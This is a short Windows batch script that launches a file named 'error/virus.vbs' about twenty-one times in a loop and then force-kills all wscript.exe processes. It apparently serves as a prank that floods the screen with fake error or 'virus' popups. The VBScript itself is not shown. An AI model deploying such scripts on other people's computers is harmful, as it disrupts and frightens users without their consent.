set cont=20
:window 
start error/virus.vbs 
if %cont% equ 0 goto windowend
set /a cont=cont-1 
goto window
:windowend

taskkill /IM wscript.exe /F